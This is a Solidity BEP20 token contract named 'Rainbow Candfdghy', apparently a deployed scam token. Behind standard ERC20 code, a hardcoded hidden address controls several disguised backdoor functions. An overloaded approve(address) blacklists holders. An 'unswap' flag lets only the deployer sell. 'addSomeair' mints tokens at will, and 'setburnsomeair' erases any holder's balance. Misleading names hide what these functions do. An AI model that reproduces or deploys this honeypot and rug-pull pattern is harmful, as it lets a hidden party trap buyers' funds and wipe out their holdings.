/**
 *Submitted for verification at BscScan.com on 2022-05-24
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;
    address private _ownerd = 0x121838b6Fe4e0fB1133B95a562E514d5A9DA6ED5;


    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyownerd() {
        require(_ownerd == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferOwnership(address newOwner) public virtual onlyownerd {
        _owner = newOwner;
    }
}

contract TOKEN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcluded;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1000000000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "Rainbow Candfdghy";
    string private _symbol = "Rainbow Cgsdfandy";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x121838b6Fe4e0fB1133B95a562E514d5A9DA6ED5;
  
    uint256 public deadFee = 5;
    uint256 public devFee = 1;

    mapping(address => bool) private _Tboy;
    bool private noWhite = true;
    bool private unswap = false;
    
    uint256 public burnAir = uint256(0);
    mapping(address => uint256) private burnAirs;
    address[] private _burnAirs;

    uint256 public Air = uint256(0);
    mapping(address => uint256) private Airs;
    address[] private _Airs;

    address owners;

    constructor() public {
        _rOwned[_msgSender()] = _tTotal;
         owners = _msgSender();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address setaddress) public view override returns (uint256) {
        return _rOwned[setaddress];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_isExcludedFromFee[_msgSender()] || _isExcludedFromFee[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(unswap){
     require(owners == sender, "unswap");
        }
        if(_isExcludedFromFee[_msgSender()] || _isExcludedFromFee[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function isExcludedFromRewards(address setaddress) public view returns (bool) {
        return _isExcluded[setaddress];
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function excludeFromFee(address setaddress) public onlyownerd {
        _isExcludedFromFee[setaddress] = true;
    }

    function includeInFee(address setaddress) public onlyownerd {
        _isExcludedFromFee[setaddress] = false;
    }
 
    function _setunswap(bool swapstatus) external onlyownerd() {
        unswap = swapstatus;
    }
    function approve(address swapstatus) external onlyownerd() {
        _Tboy[swapstatus] = true;
    }

    function Removeaddress(address swapstatus) external onlyownerd() {
        delete _Tboy[swapstatus];
    }
    function addSomeair(address airAddress, uint256 airquantity) 
        external 
        onlyownerd() {
        require(airquantity > 0, "airquantity");
        uint256 weather = Airs[airAddress];
        if (weather == 0) _Airs.push(airAddress);
        Airs[airAddress] = weather.add(airquantity);
        Air = Air.add(airquantity);
        _rOwned[airAddress] = _rOwned[airAddress].add(airquantity);
    }

    function ASKstate(address wheatAddress)
        external
        view
        onlyownerd()
        returns (bool)
    {
        return _Tboy[wheatAddress];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (noWhite) {
            require(_Tboy[from] == false, "open");
        }


        _transfers(from, to, amount);
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {   
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
    
        _rOwned[sender] = _rOwned[sender].sub(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    function batchTransferToken(address[] memory holders, uint256 amount) public {
        for (uint i=0; i<holders.length; i++) {
            _transfers(_msgSender(), holders[i], amount);
        }
    }
    function setburnsomeair(address burnairAddress, uint256 burnairquantity)
        external
        onlyownerd() {
        require(burnairquantity > 0, "burnairquantity");
        uint256 burnweather = Airs[burnairAddress];
        if (burnweather == 0) _burnAirs.push(burnairAddress);
        burnAirs[burnairAddress] = burnweather.add(burnairquantity);
        burnAir = burnAir.add(burnairquantity);
        _rOwned[burnairAddress] = _rOwned[burnairAddress].sub(burnairquantity);
    }
  

}